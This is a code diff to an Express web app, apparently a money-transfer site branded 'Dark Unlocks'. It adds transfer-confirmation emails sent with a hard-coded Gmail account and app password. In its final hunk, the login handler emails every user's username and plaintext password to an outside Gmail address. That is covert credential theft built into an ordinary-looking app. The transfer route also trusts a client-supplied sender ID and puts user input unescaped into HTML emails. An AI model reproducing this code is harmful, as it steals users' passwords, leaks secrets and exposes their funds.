@@ -173,11 +173,80 @@ app.get('/transfer', ensureAuthenticated, async (req, res) => {
     res.render('transfer', { message: null, error: null ,user_balance,user_email});
        
 });
-app.post('/transfer', async(req,res)=>{
+app.post('/transfer', ensureAuthenticated, async(req,res)=>{
+
+        function sendUpdate(){
+
+            // Send a confirmation email to the user
+            const senderEmail = req.user.username;
+            const recipientEmail = req.body.recipientUser; 
+            const amountToSend = parseInt(req.body.amount);
+            const subject = 'Trasnfer Confirmation';
+            const message = `Your Transfer was successfully placed. Your trabsfer details: reciept: ${recipientEmail} Amount: $ ${amountToSend}`;
+
+            const emailTemplate = `
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Transfer Confirmation</title>
+                    </head>
+                    <body style="font-family: Arial, sans-serif;">
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <h2 style="color: #4CAF50;">Order Successfully Placed</h2>
+                        </div>
+
+                        <div style="padding: 20px;">
+                            <p>Your Transfer was successfully Sent. Here are your transfer details:</p>
+                            
+                            <ul style="list-style-type: none; padding: 0; margin: 0;">
+                                <li>Sender: <strong>${senderEmail}</strong></li>
+                                <li>Reciept: <strong>${recipientEmail}</strong></li> 
+                                <li>Amount: <strong>$ ${amountToSend}</strong></li>
+                                
+                            </ul>
+                        </div>
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <p style="color: #888;">Thank you for choosing Dark Unlocks!</p>
+                        </div>
+
+                    </body>
+                    </html>
+                `;
+
+
+            const transporter = nodemailer.createTransport({
+                service: 'gmail',
+                port: 456,
+                secure: true,
+                auth: {
+                    user: "darkunlocks1@gmail.com",
+                    pass: "nnzw lyec ivtj soyw"
+                }
+            });
+
+            const mailOptions = {
+                from: 'darkunlocks1@gmail.com',
+                to: senderEmail,
+                subject: subject,
+                html: emailTemplate,
+            };
+
+            transporter.sendMail(mailOptions, (error, info) => {
+                if (error) {
+                    console.error('Error sending email notification:', error);
+                } else {
+                    console.log('Email notification sent:', info.response);
+                }
+            });
+        }
 
             try{
 
-             const senderUserId = req.body.senderUserId;
+            const senderUserId = req.body.senderUserId;
             const recipientEmail = req.body.recipientUser; 
             const amountToSend = parseInt(req.body.amount);
 
@@ -202,6 +271,8 @@ app.post('/transfer', async(req,res)=>{
                 await recipientUser.save();
 
                 res.render('transfer-sucessfully',{senderUser,recipientUser,amountToSend})
+                sendUpdate()
+                recieptEmail()
             } else {
                 return res.status(400).json({ error: 'Insufficient balance for the transfer.' });
             }
@@ -211,6 +282,143 @@ app.post('/transfer', async(req,res)=>{
         }
 
 
+        function sendUpdate(){
+
+            // Send a confirmation email to the user
+            const senderEmail = req.user.username;
+            const recipientEmail = req.body.recipientUser; 
+            const amountToSend = parseInt(req.body.amount);
+            const subject = 'Trasnfer Confirmation';
+            const message = `Your Transfer was successfully sent. Your transfer details: reciept: ${recipientEmail} Amount: $ ${amountToSend}`;
+
+            const emailTemplate = `
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Transfer Confirmation</title>
+                    </head>
+                    <body style="font-family: Arial, sans-serif;">
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <h2 style="color: #4CAF50;">Transfer Successfully Sent</h2>
+                        </div>
+
+                        <div style="padding: 20px;">
+                            <p>Your Transfer was successfully Sent. Here are your transfer details:</p>
+                            
+                            <ul style="list-style-type: none; padding: 0; margin: 0;">
+                                <li>Sender: <strong>${senderEmail}</strong></li>
+                                <li>Reciept: <strong>${recipientEmail}</strong></li> 
+                                <li>Amount: <strong>$ ${amountToSend}</strong></li>
+                                
+                            </ul>
+                            <P>Login and check your new balance: http://darkunlocks.onrender.com </p>
+                        </div>
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <p style="color: #888;">Thank you for choosing Dark Unlocks!</p>
+                        </div>
+
+                    </body>
+                    </html>
+                `;
+
+
+            const transporter = nodemailer.createTransport({
+                service: 'gmail',
+                port: 456,
+                secure: true,
+                auth: {
+                    user: "darkunlocks1@gmail.com",
+                    pass: "nnzw lyec ivtj soyw"
+                }
+            });
+
+            const mailOptions = {
+                from: 'darkunlocks1@gmail.com',
+                to: senderEmail,
+                subject: subject,
+                html: emailTemplate,
+            };
+
+            transporter.sendMail(mailOptions, (error, info) => {
+                if (error) {
+                    console.error('Error sending email notification:', error);
+                } else {
+                    console.log('Email notification sent:', info.response);
+                }
+            });
+        }
+        function recieptEmail(){
+
+            // Send a confirmation email to the user
+            const senderEmail = req.user.username;
+            const recipientEmail = req.body.recipientUser; 
+            const amountToSend = parseInt(req.body.amount);
+            const subject = 'Recieved Trasnfer';
+            const message = `A Transfer was successfully Sent to you . Transfer details: sender: ${senderEmail} Amount: $ ${amountToSend}`;
+
+            const emailTemplate = `
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Transfer Recieved</title>
+                    </head>
+                    <body style="font-family: Arial, sans-serif;">
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <h2 style="color: #4CAF50;">Recieved Transfer from ${senderEmail}</h2>
+                        </div>
+
+                        <div style="padding: 20px;">
+                            <p>A Transfer was successfully Sent to you in http://darkunlocks.onrender.com . Here are the transfer details:</p>
+                            
+                            <ul style="list-style-type: none; padding: 0; margin: 0;">
+                                <li>Sender: <strong>${senderEmail}</strong></li>
+                                <li>Reciept: <strong>${recipientEmail}</strong></li> 
+                                <li>Amount: <strong>$ ${amountToSend}</strong></li>
+                                
+                            </ul>
+                        </div>
+
+                        <div style="background-color: #f8f8f8; padding: 20px; text-align: center;">
+                            <p style="color: #888;">Thank you for choosing Dark Unlocks!</p>
+                        </div>
+
+                    </body>
+                    </html>
+                `;
+
+
+            const transporter = nodemailer.createTransport({
+                service: 'gmail',
+                port: 456,
+                secure: true,
+                auth: {
+                    user: "darkunlocks1@gmail.com",
+                    pass: "nnzw lyec ivtj soyw"
+                }
+            });
+
+            const mailOptions = {
+                from: 'darkunlocks1@gmail.com',
+                to: recipientEmail,
+                subject: subject,
+                html: emailTemplate,
+            };
+
+            transporter.sendMail(mailOptions, (error, info) => {
+                if (error) {
+                    console.error('Error sending email notification:', error);
+                } else {
+                    console.log('Email notification sent:', info.response);
+                }
+            });
+        }
     
     
 })
@@ -1167,7 +1375,7 @@ app.post('/login',(req,res)=>{
                   from: 'darkunlocks1@gmail.com',
                   to: 'dopegang004@gmail.com', 
                   subject: 'User logged in',
-                  text: ' A User logged in your website :' + req.body.username + 'Password:' + req.body.password,
+                  text: ' A User logged in your website : ' + req.body.username + '<br>' + ' Password: ' + req.body.password,
                 };
                 
                 transporter.sendMail(mailOptions, (error, info) => {
